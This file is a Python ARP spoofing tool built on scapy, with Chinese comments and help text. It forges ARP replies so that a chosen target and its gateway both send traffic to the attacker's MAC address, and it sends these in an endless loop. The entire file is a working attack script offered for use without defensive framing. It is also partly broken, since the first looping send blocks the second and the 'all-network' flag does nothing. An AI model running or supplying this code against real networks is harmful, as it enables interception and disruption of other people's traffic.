#!/usr/bin/env python3
#coding:utf-8

import argparse
from scapy.all import ARP,Ether,get_if_hwaddr,sendp,getmacbyip

def get_mac(target_ip):
    target_mac=getmacbyip(target_ip)
    if target_mac is not None:
        return target_mac
    else:
        print(f'无法获取IP为{target_ip}的主机MAC地址，请检查目标IP是否存活.')
        exit(0)

#伪装成网关欺骗目标计算机
def arp2station(src_mac,target_mac,gateway_ip,target_ip):
    eth=Ether(src=src_mac,dst=target_mac)
    arp=ARP(hwsrc=src_mac,psrc=gateway_ip,hwdst=target_mac,pdst=target_ip,op='is-at')
    packet=eth/arp
    return packet

#伪装成目标计算机欺骗网关
def arp2gateway(src_mac,gateway_mac,target_ip,gateway_ip):
    eth=Ether(src=src_mac,dst=gateway_mac)
    arp=ARP(hwsrc=src_mac,psrc=target_ip,hwdst=gateway_mac,pdst=gateway_ip,op='is-at')
    packet=eth/arp
    return packet

def main():
    parser=argparse.ArgumentParser(description='ARP攻击脚步')
    parser.add_argument('-sm',dest='srcmac',type=str,help=\
                       '发送源计算机的MAC，如果不提供将使用本机MAC')
    parser.add_argument('-t',dest='targetip',type=str,help=\
                       '指定目标计算机IP',required=True)
    parser.add_argument('-tm',dest='targetmac',type=str,help=\
                       '指定目标计算机MAC，如果不提供将根据其IP自动获取')
    parser.add_argument('-g',dest='gatewayip',type=str,help=\
                       '指定网关IP',required=True)
    parser.add_argument('-gm',dest='gatewaymac',type=str,help=\
                       '指定网关MAC，如果不提供将根据其IP自动获取')
    parser.add_argument('-i',dest='interface',type=str,help=\
                       '指定使用的网卡',required=True)
    parser.add_argument('-a',dest='allarp',action='store_true',help=\
                       '是否进行全网arp欺骗')

    args=parser.parse_args()

    target_ip=args.targetip
    gateway_ip=args.gatewayip
    interface=args.interface

    src_mac=args.srcmac
    target_mac=args.targetmac
    gateway_mac=args.gatewaymac
    attack_all=args.allarp

    if target_ip is None or gateway_ip is None or interface is None:
        print(argparse.print_help())
        exit(0)

    if src_mac is None:
        src_mac=get_if_hwaddr(interface)

    if target_mac is None:
        target_mac=get_mac(target_ip)

    if gateway_mac is None:
        gateway_mac=get_mac(gateway_ip)

    print(f'本机MAC地址是：{src_mac}')
    print(f'目标计算机IP地址是：{target_ip}')
    print(f'目标计算机MAC地址是：{target_mac}')
    print(f'网关IP地址是：{gateway_ip}')
    print(f'网关MAC地址是：{gateway_mac}')

    input('按任意键继续 ')

    arp2s=arp2station(src_mac,target_mac,gateway_ip,target_ip)
    arp2g=arp2gateway(src_mac,gateway_mac,target_ip,gateway_ip)

    sendp(arp2s,inter=1,loop=1)
    sendp(arp2g,inter=1,loop=1)

if __name__=='__main__':
    main()


